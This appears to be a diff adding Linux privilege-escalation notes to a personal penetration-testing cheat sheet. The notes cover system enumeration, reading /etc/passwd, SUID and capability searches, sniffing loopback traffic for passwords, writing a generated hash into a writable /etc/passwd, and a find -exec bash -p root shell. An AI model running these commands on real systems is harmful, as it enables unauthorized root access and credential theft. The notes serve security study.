@@ -158,7 +158,65 @@ Cross compileing c program into binary for 64bit Windows in Kali
         
               return 0;
             }
+
+Linux Privilege Escalation:
+    Manual Enumeration of OS:
+        User context information:
+
+            id
+            cat /etc/passwd
+            hostname
+            env
+        System information:
+            cat /etc/issue
+            cat /etc/os-release
+            uname -a
+        Running Processes:
+            ps aux
+            watch -n 1 "ps -aux | grep pass" (run ps aux every 1 second and search for word pass)
+        Network info:
+            ifconfig a
+            ip a
+            route
+            routel
+        For active listening ports and network connections:
+            netstat -anp
+            ss -anp
+        Firewall Rules:
+            iptables (requires root access)
+            cat /etc/iptables/rules.v4 (may have access missconfigured)
+
+        Scheduled Tasks (crons)
+            ls -lah /etc/cron*
+            crontab -l (list jobs for current user)
+            grep "CRON" /var/log/syslog
+
+        List apps:
+            dpkg -l
+        list directories that user has perrmissions on:
+            find / -writable -type d 2>/dev/null
+
+        Checking Drives and mounted filesystems:
+            cat /etc/fstab
+            mount
+            lsblk (available disks)
+        Loaded kernel modules:
+            lsmod
+            /sbin/modinfo <loaded module name>
+        Search for SUID marked bineries:
+            find / -perm -u=s -type f 2>/dev/null
+        Network Traffic Capture (Requires sudo privileges)
+            sudo tcpdump -i lo -A | grep "pass"
+
+        Generate password for /etc/passwd (if writeable perrmisions)
+            openssl passwd <password>
+        If Any commands have SUID flag (written "s" in ls -asl (/usr/bin/ is the directory for them)):
+            find /home/joe/Desktop -exec "/usr/bin/bash" -p \; (find example)
+        Search for Binaries with CAPABILITIES:
+            /usr/sbin/getcap -r / 2>/dev/null IF ANYthing is found with setuid+ep (effective and permitted) search on GTFOBins and then capabilities inside
             
+    Automated Testing:
+        ./unix-privesc-check standard > output.txt (first download unix-privesc-check on target machine)
 Password Shit:
         Hydra:
 
